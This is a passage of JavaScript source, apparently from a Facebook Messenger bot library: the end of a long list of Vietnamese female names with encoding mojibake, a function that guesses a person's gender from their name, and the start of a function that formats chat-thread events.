\"M·ªông H·∫±ng\",\n    \"M·ªông Lan\",\n    \"M·ªông Li·ªÖu\",\n    \"M·ªông Nguy·ªát\",\n    \"M·ªông Nhi\",\n    \"M·ªông Qu·ª≥nh\",\n    \"M·ªông Thi\",\n    \"M·ªông Thu\",\n    \"M·ªông Tuy·ªÅn\",\n    \"M·ªông Vi\",\n    \"M·ªông Vy\",\n    \"M·ªông V√¢n\",\n    \"M·ªông √êi·ªáp\",\n    \"M·ªπ Anh\",\n    \"M·ªπ Di·ªÖm\",\n    \"M·ªπ Dung\",\n    \"M·ªπ Duy√™n\",\n    \"M·ªπ Hi·ªáp\",\n    \"M·ªπ Ho√†n\",\n    \"M·ªπ Huy·ªÅn\",\n    \"M·ªπ Hu·ªá\",\n    \"M·ªπ H∆∞·ªùng\",\n    \"M·ªπ H·∫°nh\",\n    \"M·ªπ Khuy√™n\",\n    \"M·ªπ Ki·ªÅu\",\n    \"M·ªπ Lan\",\n    \"M·ªπ Loan\",\n    \"M·ªπ L·ªá\",\n    \"M·ªπ L·ª£i\",\n    \"M·ªπ Nga\",\n    \"M·ªπ Ng·ªçc\",\n    \"M·ªπ Nhi\",\n    \"M·ªπ Nh√¢n\",\n    \"M·ªπ N∆∞∆°ng\",\n    \"M·ªπ Ph∆∞∆°ng\",\n    \"M·ªπ Ph∆∞·ª£ng\",\n    \"M·ªπ Ph·ª•ng\",\n    \"M·ªπ Thu·∫ßn\",\n    \"M·ªπ Thu·∫≠n\",\n    \"M·ªπ Trang\",\n    \"M·ªπ Tr√¢m\",\n    \"M·ªπ T√¢m\",\n    \"M·ªπ Uy√™n\",\n    \"M·ªπ V√¢n\",\n    \"M·ªπ Xu√¢n\",\n    \"M·ªπ Y·∫øn\",\n    \"Nghi Dung\",\n    \"Nghi Minh\",\n    \"Nghi Xu√¢n\",\n    \"Nguy√™n H·ªìng\",\n    \"Nguy√™n Th·∫£o\",\n    \"Nguy·∫øt √Ånh\",\n    \"Nguy·ªát Anh\",\n    \"Nguy·ªát C√°t\",\n    \"Nguy·ªát C·∫ßm\",\n    \"Nguy·ªát H√†\",\n    \"Nguy·ªát H·ªìng\",\n    \"Nguy·ªát Lan\",\n    \"Nguy·ªát Minh\",\n    \"Nguy·ªát Nga\",\n    \"Nguy·ªát Qu·∫ø\",\n    \"Nguy·ªát Uy·ªÉn\",\n    \"Nguy·ªát √Ånh\",\n    \"Ng√¢n Anh\",\n    \"Ng√¢n H√†\",\n    \"Ng√¢n Thanh\",\n    \"Ng√¢n Tr√∫c\",\n    \"Ng·ªçc Anh\",\n    \"Ng·ªçc B√≠ch\",\n    \"Ng·ªçc C·∫ßm\",\n    \"Ng·ªçc Di·ªáp\",\n    \"Ng·ªçc Dung\",\n    \"Ng·ªçc Hi·ªÅn\",\n    \"Ng·ªçc Hoa\",\n    \"Ng·ªçc Hoan\",\n    \"Ng·ªçc Ho√†n\",\n    \"Ng·ªçc Huy·ªÅn\",\n    \"Ng·ªçc Hu·ªá\",\n    \"Ng·ªçc H√†\",\n    \"Ng·ªçc H√¢n\",\n    \"Ng·ªçc H·∫°\",\n    \"Ng·ªçc H·∫°nh\",\n    \"Ng·ªçc H·∫±ng\",\n    \"Ng·ªçc Khanh\",\n    \"Ng·ªçc Khu√™\",\n    \"Ng·ªçc Kh√°nh\",\n    \"Ng·ªçc Lam\",\n    \"Ng·ªçc Lan\",\n    \"Ng·ªçc Linh\",\n    \"Ng·ªçc Li√™n\",\n    \"Ng·ªçc Loan\",\n    \"Ng·ªçc Ly\",\n    \"Ng·ªçc L√¢m\",\n    \"Ng·ªçc L√Ω\",\n    \"Ng·ªçc L·ªá\",\n    \"Ng·ªçc Mai\",\n    \"Ng·ªçc Nhi\",\n    \"Ng·ªçc N·ªØ\",\n    \"Ng·ªçc Oanh\",\n    \"Ng·ªçc Ph·ª•ng\",\n    \"Ng·ªçc Quy√™n\",\n    \"Ng·ªçc Qu·∫ø\",\n    \"Ng·ªçc Qu·ª≥nh\",\n    \"Ng·ªçc San\",\n    \"Ng·ªçc S∆∞∆°ng\",\n    \"Ng·ªçc Thi\",\n    \"Ng·ªçc Thy\",\n    \"Ng·ªçc Th∆°\",\n    \"Ng·ªçc Trinh\",\n    \"Ng·ªçc Tr√¢m\",\n    \"Ng·ªçc Tuy·∫øt\",\n    \"Ng·ªçc T√¢m\",\n    \"Ng·ªçc T√∫\",\n    \"Ng·ªçc Uy√™n\",\n    \"Ng·ªçc Uy·ªÉn\",\n    \"Ng·ªçc Vy\",\n    \"Ng·ªçc V√¢n\",\n    \"Ng·ªçc Y·∫øn\",\n    \"Ng·ªçc √Åi\",\n    \"Ng·ªçc √Ånh\",\n    \"Ng·ªçc √êi·ªáp\",\n    \"Ng·ªçc √ê√†n\",\n    \"Ng·ªçc √ê√†o\",\n    \"Nhan H·ªìng\",\n    \"Nh√£ H∆∞∆°ng\",\n    \"Nh√£ H·ªìng\",\n    \"Nh√£ Khanh\",\n    \"Nh√£ L√Ω\",\n    \"Nh√£ Mai\",\n    \"Nh√£ S∆∞∆°ng\",\n    \"Nh√£ Thanh\",\n    \"Nh√£ Trang\",\n    \"Nh√£ Tr√∫c\",\n    \"Nh√£ Uy√™n\",\n    \"Nh√£ Y·∫øn\",\n    \"Nh√£ √ù\",\n    \"Nh∆∞ Anh\",\n    \"Nh∆∞ B·∫£o\",\n    \"Nh∆∞ Hoa\",\n    \"Nh∆∞ H·∫£o\",\n    \"Nh∆∞ H·ªìng\",\n    \"Nh∆∞ Loan\",\n    \"Nh∆∞ Mai\",\n    \"Nh∆∞ Ng√†\",\n    \"Nh∆∞ Ng·ªçc\",\n    \"Nh∆∞ Ph∆∞∆°ng\",\n    \"Nh∆∞ Qu√¢n\",\n    \"Nh∆∞ Qu·ª≥nh\",\n    \"Nh∆∞ Th·∫£o\",\n    \"Nh∆∞ Tr√¢n\",\n    \"Nh∆∞ T√¢m\",\n    \"Nh∆∞ √ù\",\n    \"Nh·∫•t Th∆∞∆°ng\",\n    \"Nh·∫≠t D·∫°\",\n    \"Nh·∫≠t H√†\",\n    \"Nh·∫≠t H·∫°\",\n    \"Nh·∫≠t Lan\",\n    \"Nh·∫≠t Linh\",\n    \"Nh·∫≠t L·ªá\",\n    \"Nh·∫≠t Mai\",\n    \"Nh·∫≠t Ph∆∞∆°ng\",\n    \"Nh·∫≠t √Ånh\",\n    \"Oanh Th∆°\",\n    \"Oanh V≈©\",\n    \"Phi Khanh\",\n    \"Phi Nhung\",\n    \"Phi Nh·∫°n\",\n    \"Phi Phi\",\n    \"Phi Ph∆∞·ª£ng\",\n    \"Phong Lan\",\n    \"Ph∆∞∆°ng An\",\n    \"Ph∆∞∆°ng Anh\",\n    \"Ph∆∞∆°ng Chi\",\n    \"Ph∆∞∆°ng Ch√¢u\",\n    \"Ph∆∞∆°ng Di·ªÖm\",\n    \"Ph∆∞∆°ng Dung\",\n    \"Ph∆∞∆°ng Giang\",\n    \"Ph∆∞∆°ng Hi·ªÅn\",\n    \"Ph∆∞∆°ng Hoa\",\n    \"Ph∆∞∆°ng H·∫°nh\",\n    \"Ph∆∞∆°ng Lan\",\n    \"Ph∆∞∆°ng Linh\",\n    \"Ph∆∞∆°ng Li√™n\",\n    \"Ph∆∞∆°ng Loan\",\n    \"Ph∆∞∆°ng Mai\",\n    \"Ph∆∞∆°ng Nghi\",\n    \"Ph∆∞∆°ng Ng·ªçc\",\n    \"Ph∆∞∆°ng Nhi\",\n    \"Ph∆∞∆°ng Nhung\",\n    \"Ph∆∞∆°ng Ph∆∞∆°ng\",\n    \"Ph∆∞∆°ng Quy√™n\",\n    \"Ph∆∞∆°ng Qu√¢n\",\n    \"Ph∆∞∆°ng Qu·∫ø\",\n    \"Ph∆∞∆°ng Qu·ª≥nh\",\n    \"Ph∆∞∆°ng Thanh\",\n    \"Ph∆∞∆°ng Thi\",\n    \"Ph∆∞∆°ng Th√πy\",\n    \"Ph∆∞∆°ng Th·∫£o\",\n    \"Ph∆∞∆°ng Th·ªßy\",\n    \"Ph∆∞∆°ng Trang\",\n    \"Ph∆∞∆°ng Trinh\",\n    \"Ph∆∞∆°ng Tr√†\",\n    \"Ph∆∞∆°ng Tr√¢m\",\n    \"Ph∆∞∆°ng T√¢m\",\n    \"Ph∆∞∆°ng Uy√™n\",\n    \"Ph∆∞∆°ng Y·∫øn\",\n    \"Ph∆∞·ªõc B√¨nh\",\n    \"Ph∆∞·ªõc Hu·ªá\",\n    \"Ph∆∞·ª£ng B√≠ch\",\n    \"Ph∆∞·ª£ng Li√™n\",\n    \"Ph∆∞·ª£ng Loan\",\n    \"Ph∆∞·ª£ng L·ªá\",\n    \"Ph∆∞·ª£ng Nga\",\n    \"Ph∆∞·ª£ng Nhi\",\n    \"Ph∆∞·ª£ng Ti√™n\",\n    \"Ph∆∞·ª£ng Uy√™n\",\n    \"Ph∆∞·ª£ng Vy\",\n    \"Ph∆∞·ª£ng V≈©\",\n    \"Ph·ª•ng Y·∫øn\",\n    \"Qu·∫ø Anh\",\n    \"Qu·∫ø Chi\",\n    \"Qu·∫ø Linh\",\n    \"Qu·∫ø L√¢m\",\n    \"Qu·∫ø Ph∆∞∆°ng\",\n    \"Qu·∫ø Thu\",\n    \"Qu·ª≥nh Anh\",\n    \"Qu·ª≥nh Chi\",\n    \"Qu·ª≥nh Dao\",\n    \"Qu·ª≥nh Dung\",\n    \"Qu·ª≥nh Giang\",\n    \"Qu·ª≥nh Giao\",\n    \"Qu·ª≥nh Hoa\",\n    \"Qu·ª≥nh H√†\",\n    \"Qu·ª≥nh H∆∞∆°ng\",\n    \"Qu·ª≥nh Lam\",\n    \"Qu·ª≥nh Li√™n\",\n    \"Qu·ª≥nh L√¢m\",\n    \"Qu·ª≥nh Nga\",\n    \"Qu·ª≥nh Ng√¢n\",\n    \"Qu·ª≥nh Nhi\",\n    \"Qu·ª≥nh Nhung\",\n    \"Qu·ª≥nh Nh∆∞\",\n    \"Qu·ª≥nh Ph∆∞∆°ng\",\n    \"Qu·ª≥nh Sa\",\n    \"Qu·ª≥nh Thanh\",\n    \"Qu·ª≥nh Th∆°\",\n    \"Qu·ª≥nh Ti√™n\",\n    \"Qu·ª≥nh Trang\",\n    \"Qu·ª≥nh Tr√¢m\",\n    \"Qu·ª≥nh V√¢n\",\n    \"Sao BƒÉng\",\n    \"Sao Mai\",\n    \"Song K√™\",\n    \"Song Lam\",\n    \"Song Oanh\",\n    \"Song Th∆∞\",\n    \"S√¥ng H√†\",\n    \"S√¥ng H∆∞∆°ng\",\n    \"S∆°n Ca\",\n    \"S∆°n Tuy·ªÅn\",\n    \"S∆∞∆°ng S∆∞∆°ng\",\n    \"Thanh B√¨nh\",\n    \"Thanh D√¢n\",\n    \"Thanh Giang\",\n    \"Thanh Hi·∫øu\",\n    \"Thanh Hi·ªÅn\",\n    \"Thanh Hoa\",\n    \"Thanh Huy·ªÅn\",\n    \"Thanh H√†\",\n    \"Thanh H∆∞∆°ng\",\n    \"Thanh H∆∞·ªùng\",\n    \"Thanh H·∫°nh\",\n    \"Thanh H·∫£o\",\n    \"Thanh H·∫±ng\",\n    \"Thanh H·ªìng\",\n    \"Thanh Ki·ªÅu\",\n    \"Thanh Lam\",\n    \"Thanh Lan\",\n    \"Thanh Loan\",\n    \"Thanh L√¢m\",\n    \"Thanh Mai\",\n    \"Thanh M·∫´n\",\n    \"Thanh Nga\",\n    \"Thanh Nguy√™n\",\n    \"Thanh Ng√¢n\",\n    \"Thanh Ng·ªçc\",\n    \"Thanh Nhung\",\n    \"Thanh Nh√†n\",\n    \"Thanh Nh√£\",\n    \"Thanh Ph∆∞∆°ng\",\n    \"Thanh Thanh\",\n    \"Thanh Thi√™n\",\n    \"Thanh Thu\",\n    \"Thanh Th√∫y\",\n    \"Thanh Th∆∞\",\n    \"Thanh Th·∫£o\",\n    \"Thanh Th·ªßy\",\n    \"Thanh Trang\",\n    \"Thanh Tr√∫c\",\n    \"Thanh Tuy·∫øt\",\n    \"Thanh Tuy·ªÅn\",\n    \"Thanh T√¢m\",\n    \"Thanh Uy√™n\",\n    \"Thanh Vy\",\n    \"Thanh V√¢n\",\n    \"Thanh Xu√¢n\",\n    \"Thanh Y·∫øn\",\n    \"Thanh ƒêan\",\n    \"Thi C·∫ßm\",\n    \"Thi Ng√¥n\",\n    \"Thi Thi\",\n    \"Thi Xu√¢n\",\n    \"Thi Y·∫øn\",\n    \"Thi√™n Di\",\n    \"Thi√™n Duy√™n\",\n    \"Thi√™n Giang\",\n    \"Thi√™n H√†\",\n    \"Thi√™n H∆∞∆°ng\",\n    \"Thi√™n Kh√°nh\",\n    \"Thi√™n Kim\",\n    \"Thi√™n Lam\",\n    \"Thi√™n Lan\",\n    \"Thi√™n Mai\",\n    \"Thi√™n M·ªπ\",\n    \"Thi√™n Nga\",\n    \"Thi√™n N∆∞∆°ng\",\n    \"Thi√™n Ph∆∞∆°ng\",\n    \"Thi√™n Thanh\",\n    \"Thi√™n Th√™u\",\n    \"Thi√™n Th∆∞\",\n    \"Thi√™n Th·∫£o\",\n    \"Thi√™n Trang\",\n    \"Thi√™n Tuy·ªÅn\",\n    \"Thi·∫øu Mai\",\n    \"Thi·ªÅu Ly\",\n    \"Thi·ªán M·ªπ\",\n    \"Thi·ªán Ti√™n\",\n    \"Thu Duy√™n\",\n    \"Thu Giang\",\n    \"Thu Hi·ªÅn\",\n    \"Thu Ho√†i\",\n    \"Thu Huy·ªÅn\",\n    \"Thu Hu·ªá\",\n    \"Thu H√†\",\n    \"Thu H·∫≠u\",\n    \"Thu H·∫±ng\",\n    \"Thu H·ªìng\",\n    \"Thu Linh\",\n    \"Thu Li√™n\",\n    \"Thu Loan\",\n    \"Thu Mai\",\n    \"Thu Minh\",\n    \"Thu Nga\",\n    \"Thu Nguy·ªát\",\n    \"Thu Ng√†\",\n    \"Thu Ng√¢n\",\n    \"Thu Ng·ªçc\",\n    \"Thu Nhi√™n\",\n    \"Thu Oanh\",\n    \"Thu Phong\",\n    \"Thu Ph∆∞∆°ng\",\n    \"Thu Ph∆∞·ª£ng\",\n    \"Thu S∆∞∆°ng\",\n    \"Thu Thu·∫≠n\",\n    \"Thu Th·∫£o\",\n    \"Thu Th·ªßy\",\n    \"Thu Trang\",\n    \"Thu Vi·ªát\",\n    \"Thu V√¢n\",\n    \"Thu V·ªçng\",\n    \"Thu Y·∫øn\",\n    \"Thu·∫ßn H·∫≠u\",\n    \"Thy Khanh\",\n    \"Thy Oanh\",\n    \"Thy Tr√∫c\",\n    \"Thy V√¢n\",\n    \"Th√°i Chi\",\n    \"Th√°i H√†\",\n    \"Th√°i H·ªìng\",\n    \"Th√°i Lan\",\n    \"Th√°i L√¢m\",\n    \"Th√°i Thanh\",\n    \"Th√°i Th·∫£o\",\n    \"Th√°i T√¢m\",\n    \"Th√°i V√¢n\",\n    \"Th√πy Anh\",\n    \"Th√πy Dung\",\n    \"Th√πy D∆∞∆°ng\",\n    \"Th√πy Giang\",\n    \"Th√πy Linh\",\n    \"Th√πy Mi\",\n    \"Th√πy My\",\n    \"Th√πy Nhi\",\n    \"Th√πy Nh∆∞\",\n    \"Th√πy Oanh\",\n    \"Th√πy Uy√™n\",\n    \"Th√πy V√¢n\",\n    \"Th√∫y Anh\",\n    \"Th√∫y Di·ªÖm\",\n    \"Th√∫y Hi·ªÅn\",\n    \"Th√∫y Huy·ªÅn\",\n    \"Th√∫y H√†\",\n    \"Th√∫y H∆∞∆°ng\",\n    \"Th√∫y H∆∞·ªùng\",\n    \"Th√∫y H·∫°nh\",\n    \"Th√∫y H·∫±ng\",\n    \"Th√∫y Ki·ªÅu\",\n    \"Th√∫y Li√™n\",\n    \"Th√∫y Li·ªÖu\",\n    \"Th√∫y Loan\",\n    \"Th√∫y Mai\",\n    \"Th√∫y Minh\",\n    \"Th√∫y My\",\n    \"Th√∫y Nga\",\n    \"Th√∫y Ng√†\",\n    \"Th√∫y Ng√¢n\",\n    \"Th√∫y Ng·ªçc\",\n    \"Th√∫y Ph∆∞·ª£ng\",\n    \"Th√∫y Qu·ª≥nh\",\n    \"Th√∫y Vi\",\n    \"Th√∫y Vy\",\n    \"Th√∫y V√¢n\",\n    \"Th∆° Th∆°\",\n    \"Th∆∞ L√¢m\",\n    \"Th∆∞ S∆∞∆°ng\",\n    \"Th∆∞∆°ng Huy·ªÅn\",\n    \"Th∆∞∆°ng Nga\",\n    \"Th∆∞∆°ng Th∆∞∆°ng\",\n    \"Th∆∞·ªùng Xu√¢n\",\n    \"Th·∫°ch Th·∫£o\",\n    \"Th·∫£o H∆∞∆°ng\",\n    \"Th·∫£o H·ªìng\",\n    \"Th·∫£o Linh\",\n    \"Th·∫£o Ly\",\n    \"Th·∫£o Mai\",\n    \"Th·∫£o My\",\n    \"Th·∫£o Nghi\",\n    \"Th·∫£o Nguy√™n\",\n    \"Th·∫£o Nhi\",\n    \"Th·∫£o Quy√™n\",\n    \"Th·∫£o Ti√™n\",\n    \"Th·∫£o Trang\",\n    \"Th·∫£o Uy√™n\",\n    \"Th·∫£o Vy\",\n    \"Th·∫£o V√¢n\",\n    \"Th·ª•c Anh\",\n    \"Th·ª•c Khu√™\",\n    \"Th·ª•c Nhi\",\n    \"Th·ª•c Oanh\",\n    \"Th·ª•c Quy√™n\",\n    \"Th·ª•c Trang\",\n    \"Th·ª•c Trinh\",\n    \"Th·ª•c T√¢m\",\n    \"Th·ª•c Uy√™n\",\n    \"Th·ª•c V√¢n\",\n    \"Th·ª•c √êoan\",\n    \"Th·ª•c √ê√†o\",\n    \"Th·ª•c √ê√¨nh\",\n    \"Th·ª•y Du\",\n    \"Th·ª•y Khanh\",\n    \"Th·ª•y Linh\",\n    \"Th·ª•y L√¢m\",\n    \"Th·ª•y Mi√™n\",\n    \"Th·ª•y N∆∞∆°ng\",\n    \"Th·ª•y Trinh\",\n    \"Th·ª•y Tr√¢m\",\n    \"Th·ª•y Uy√™n\",\n    \"Th·ª•y V√¢n\",\n    \"Th·ª•y √ê√†o\",\n    \"Th·ªßy H·∫±ng\",\n    \"Th·ªßy H·ªìng\",\n    \"Th·ªßy Linh\",\n    \"Th·ªßy Minh\",\n    \"Th·ªßy Nguy·ªát\",\n    \"Th·ªßy Qu·ª≥nh\",\n    \"Th·ªßy Ti√™n\",\n    \"Th·ªßy Trang\",\n    \"Th·ªßy T√¢m\",\n    \"Tinh T√∫\",\n    \"Ti√™n Ph∆∞∆°ng\",\n    \"Ti·ªÉu Mi\",\n    \"Ti·ªÉu My\",\n    \"Ti·ªÉu Qu·ª≥nh\",\n    \"Trang Anh\",\n    \"Trang Linh\",\n    \"Trang Nh√£\",\n    \"Trang T√¢m\",\n    \"Trang √ê√†i\",\n    \"Tri·ªÅu Nguy·ªát\",\n    \"Tri·ªÅu Thanh\",\n    \"Tri·ªáu M·∫´n\",\n    \"Trung Anh\",\n    \"Tr√† Giang\",\n    \"Tr√† My\",\n    \"Tr√¢m Anh\",\n    \"Tr√¢m Oanh\",\n    \"Tr√¢n Ch√¢u\",\n    \"Tr√∫c Chi\",\n    \"Tr√∫c Lam\",\n    \"Tr√∫c Lan\",\n    \"Tr√∫c Linh\",\n    \"Tr√∫c Li√™n\",\n    \"Tr√∫c Loan\",\n    \"Tr√∫c Ly\",\n    \"Tr√∫c L√¢m\",\n    \"Tr√∫c Mai\",\n    \"Tr√∫c Ph∆∞∆°ng\",\n    \"Tr√∫c Qu√¢n\",\n    \"Tr√∫c Qu·ª≥nh\",\n    \"Tr√∫c Vy\",\n    \"Tr√∫c V√¢n\",\n    \"Tr√∫c √ê√†o\",\n    \"Tr√∫c ƒê√†o\",\n    \"Tr·∫ßm H∆∞∆°ng\",\n    \"Tuy·∫øt Anh\",\n    \"Tuy·∫øt BƒÉng\",\n    \"Tuy·∫øt Chi\",\n    \"Tuy·∫øt Hoa\",\n    \"Tuy·∫øt H√¢n\",\n    \"Tuy·∫øt H∆∞∆°ng\",\n    \"Tuy·∫øt H·ªìng\",\n    \"Tuy·∫øt Lan\",\n    \"Tuy·∫øt Loan\",\n    \"Tuy·∫øt L√¢m\",\n    \"Tuy·∫øt Mai\",\n    \"Tuy·∫øt Nga\",\n    \"Tuy·∫øt Nhi\",\n    \"Tuy·∫øt Nhung\",\n    \"Tuy·∫øt Oanh\",\n    \"Tuy·∫øt Thanh\",\n    \"Tuy·∫øt Trinh\",\n    \"Tuy·∫øt Tr·∫ßm\",\n    \"Tuy·∫øt T√¢m\",\n    \"Tuy·∫øt Vy\",\n    \"Tuy·∫øt V√¢n\",\n    \"Tuy·∫øt Xu√¢n\",\n    \"Tuy·ªÅn L√¢m\",\n    \"Tu·ªá L√¢m\",\n    \"Tu·ªá M·∫´n\",\n    \"Tu·ªá Nhi\",\n    \"T√¢m Hi·ªÅn\",\n    \"T√¢m H·∫°nh\",\n    \"T√¢m H·∫±ng\",\n    \"T√¢m Khanh\",\n    \"T√¢m Linh\",\n    \"T√¢m Nguy√™n\",\n    \"T√¢m Nguy·ªát\",\n    \"T√¢m Nhi\",\n    \"T√¢m Nh∆∞\",\n    \"T√¢m Thanh\",\n    \"T√¢m Trang\",\n    \"T√¢m √êoan\",\n    \"T√¢m ƒêan\",\n    \"T√πng Linh\",\n    \"T√πng L√¢m\",\n    \"T√πng Qu√¢n\",\n    \"T√πy Anh\",\n    \"T√πy Linh\",\n    \"T√∫ Anh\",\n    \"T√∫ Ly\",\n    \"T√∫ Nguy·ªát\",\n    \"T√∫ Quy√™n\",\n    \"T√∫ Qu·ª≥nh\",\n    \"T√∫ S∆∞∆°ng\",\n    \"T√∫ Trinh\",\n    \"T√∫ T√¢m\",\n    \"T√∫ Uy√™n\",\n    \"T√∫y Loan\",\n    \"T∆∞·ªùng Chinh\",\n    \"T∆∞·ªùng Vi\",\n    \"T∆∞·ªùng Vy\",\n    \"T∆∞·ªùng V√¢n\",\n    \"T·ªãnh L√¢m\",\n    \"T·ªãnh Nhi\",\n    \"T·ªãnh Nh∆∞\",\n    \"T·ªãnh T√¢m\",\n    \"T·ªãnh Y√™n\",\n    \"T·ªë Loan\",\n    \"T·ªë Nga\",\n    \"T·ªë Nhi\",\n    \"T·ªë Quy√™n\",\n    \"T·ªë T√¢m\",\n    \"T·ªë Uy√™n\",\n    \"T·ª´ Dung\",\n    \"T·ª´ √Çn\",\n    \"Uy√™n Minh\",\n    \"Uy√™n My\",\n    \"Uy√™n Nhi\",\n    \"Uy√™n Ph∆∞∆°ng\",\n    \"Uy√™n Thi\",\n    \"Uy√™n Thy\",\n    \"Uy√™n Th∆°\",\n    \"Uy√™n Tr√¢m\",\n    \"Uy√™n Vi\",\n    \"Uy·ªÉn Khanh\",\n    \"Uy·ªÉn My\",\n    \"Uy·ªÉn Nghi\",\n    \"Uy·ªÉn Nhi\",\n    \"Uy·ªÉn Nh√£\",\n    \"Uy·ªÉn Nh∆∞\",\n    \"Vi Quy√™n\",\n    \"Vinh Di·ªáu\",\n    \"Vi·ªát H√†\",\n    \"Vi·ªát H∆∞∆°ng\",\n    \"Vi·ªát Khu√™\",\n    \"Vi·ªát Mi\",\n    \"Vi·ªát Nga\",\n    \"Vi·ªát Nhi\",\n    \"Vi·ªát Thi\",\n    \"Vi·ªát Trinh\",\n    \"Vi·ªát Tuy·∫øt\",\n    \"Vi·ªát Y·∫øn\",\n    \"Vy Lam\",\n    \"Vy Lan\",\n    \"V√†ng Anh\",\n    \"V√†nh Khuy√™n\",\n    \"V√¢n Anh\",\n    \"V√¢n Chi\",\n    \"V√¢n Du\",\n    \"V√¢n H√†\",\n    \"V√¢n H∆∞∆°ng\",\n    \"V√¢n Khanh\",\n    \"V√¢n Kh√°nh\",\n    \"V√¢n Linh\",\n    \"V√¢n Ng·ªçc\",\n    \"V√¢n Nhi\",\n    \"V√¢n Phi\",\n    \"V√¢n Ph∆∞∆°ng\",\n    \"V√¢n Quy√™n\",\n    \"V√¢n Qu·ª≥nh\",\n    \"V√¢n Thanh\",\n    \"V√¢n Th√∫y\",\n    \"V√¢n Th∆∞·ªùng\",\n    \"V√¢n Ti√™n\",\n    \"V√¢n Trang\",\n    \"V√¢n Trinh\",\n    \"V≈© H·ªìng\",\n    \"Xuy·∫øn Chi\",\n    \"Xu√¢n B·∫£o\",\n    \"Xu√¢n Dung\",\n    \"Xu√¢n Hi·ªÅn\",\n    \"Xu√¢n Hoa\",\n    \"Xu√¢n H√¢n\",\n    \"Xu√¢n H∆∞∆°ng\",\n    \"Xu√¢n H·∫°nh\",\n    \"Xu√¢n Lan\",\n    \"Xu√¢n Linh\",\n    \"Xu√¢n Li·ªÖu\",\n    \"Xu√¢n Loan\",\n    \"Xu√¢n L√¢m\",\n    \"Xu√¢n Mai\",\n    \"Xu√¢n Nghi\",\n    \"Xu√¢n Ng·ªçc\",\n    \"Xu√¢n Nhi\",\n    \"Xu√¢n Nhi√™n\",\n    \"Xu√¢n N∆∞∆°ng\",\n    \"Xu√¢n Ph∆∞∆°ng\",\n    \"Xu√¢n Ph∆∞·ª£ng\",\n    \"Xu√¢n Thanh\",\n    \"Xu√¢n Thu\",\n    \"Xu√¢n Th·∫£o\",\n    \"Xu√¢n Th·ªßy\",\n    \"Xu√¢n Trang\",\n    \"Xu√¢n T√¢m\",\n    \"Xu√¢n Uy√™n\",\n    \"Xu√¢n V√¢n\",\n    \"Xu√¢n Y·∫øn\",\n    \"Xu√¢n xanh\",\n    \"Y√™n B·∫±ng\",\n    \"Y√™n Mai\",\n    \"Y√™n Nhi\",\n    \"Y√™n √êan\",\n    \"Y√™n ƒêan\",\n    \"Y·∫øn Anh\",\n    \"Y·∫øn H·ªìng\",\n    \"Y·∫øn Loan\",\n    \"Y·∫øn Mai\",\n    \"Y·∫øn My\",\n    \"Y·∫øn Nhi\",\n    \"Y·∫øn Oanh\",\n    \"Y·∫øn Ph∆∞∆°ng\",\n    \"Y·∫øn Ph∆∞·ª£ng\",\n    \"Y·∫øn Thanh\",\n    \"Y·∫øn Th·∫£o\",\n    \"Y·∫øn Trang\",\n    \"Y·∫øn Trinh\",\n    \"Y·∫øn Tr√¢m\",\n    \"Y·∫øn √êan\",\n    \"√Åi H·ªìng\",\n    \"√Åi Khanh\",\n    \"√Åi Linh\",\n    \"√Åi Nhi\",\n    \"√Åi Nh√¢n\",\n    \"√Åi Thi\",\n    \"√Åi Thy\",\n    \"√Åi V√¢n\",\n    \"√Ånh D∆∞∆°ng\",\n    \"√Ånh Hoa\",\n    \"√Ånh H·ªìng\",\n    \"√Ånh Linh\",\n    \"√Ånh L·ªá\",\n    \"√Ånh Mai\",\n    \"√Ånh Nguy·ªát\",\n    \"√Ånh Ng·ªçc\",\n    \"√Ånh Th∆°\",\n    \"√Ånh Trang\",\n    \"√Ånh Tuy·∫øt\",\n    \"√Ånh Xu√¢n\",\n    \"√êan Khanh\",\n    \"√êan Qu·ª≥nh\",\n    \"√êan Thu\",\n    \"√êinh H∆∞∆°ng\",\n    \"√êoan Thanh\",\n    \"√êoan Trang\",\n    \"√ê√†i Trang\",\n    \"√ê√¥ng Nghi\",\n    \"√ê√¥ng Nhi\",\n    \"√ê√¥ng Tr√†\",\n    \"√ê√¥ng Tuy·ªÅn\",\n    \"√ê√¥ng Vy\",\n    \"√ê√¥ng √ê√†o\",\n    \"√ê·ªìng Dao\",\n    \"√ù B√¨nh\",\n    \"√ù Lan\",\n    \"√ù Nhi\",\n    \"ƒêan Linh\",\n    \"ƒêan Qu·ª≥nh\",\n    \"ƒêan Thanh\",\n    \"ƒêan Thu\",\n    \"ƒêan Th∆∞\",\n    \"ƒêan T√¢m\",\n    \"ƒêinh H∆∞∆°ng\",\n    \"ƒêoan Thanh\",\n    \"ƒêoan Trang\",\n    \"ƒê√†i Trang\",\n    \"ƒê√¥ng Nghi\",\n    \"ƒê√¥ng Tr√†\",\n    \"ƒê√¥ng Tuy·ªÅn\",\n    \"ƒê√¥ng Vy\",\n    \"ƒê∆°n Thu·∫ßn\",\n    \"ƒê·ª©c H·∫°nh\",\n    \"·∫§u LƒÉng\"\n]\n    let OtherName = [\".\",\",\",\"/\",\"%\", \"&\",\"*\",\"-\",\"+\"];\n    try {\n        var Name;\n            if (name == \" \" || name == null) return \"UNKNOWN\";\n            switch (female_name.some(a => name.includes(a))) {\n                case true: {\n                    if (!OtherName.includes(name)) Name = \"FEMALE\";\n                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp üåö\n                }\n            break;\n                case false: {\n                    if (female_name.some(a => name.split(' ')[name.split(' ').length - 1] == a)) Name = \"FEMALE\";\n                    else if (!OtherName.includes(name) && !female_name.includes(name)) Name = \"MALE\";\n                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp üåö\n                }\n            break;\n        } \n    }\n    catch (e) {\n        return \"UNKNOWN\";\n    }\n    return Name || \"UNKNOWN\";\n}\n\n/**\n * @param {{ [x: string]: { [x: string]: { [x: string]: any; }; }; class: any; untypedData: any; name: any; addedParticipants: any; leftParticipantFbId: any; messageMetadata: { threadKey: { threadFbId: any; otherUserFbId: any; }; adminText: any; actorFbId: any; }; participants: any; }} m\n */\n\nfunction formatDeltaEvent(m) {\n    var { updateData,getData,hasData } = require('./Extra/ExtraGetThread');\n    var logMessageType;\n    var logMessageData;\n\nswitch (m.class) {\n    case \"AdminTextMessage\":\n        logMessageType = getAdminTextMessageType(m);\n            logMessageData = m.untypedData;\n        break;\n    case \"ThreadName\":\n        logMessageType = \"log:thread-name\";\n            logMessageData = { name: m.name };\n        break;\n    case \"ParticipantsAddedToGroupThread\":\n        logMessageType = \"log:subscribe\";\n            logMessageData = { addedParticipants: m.addedParticipants };\n        break;\n    case \"ParticipantLeftGroupThread\":\n        logMessageType = 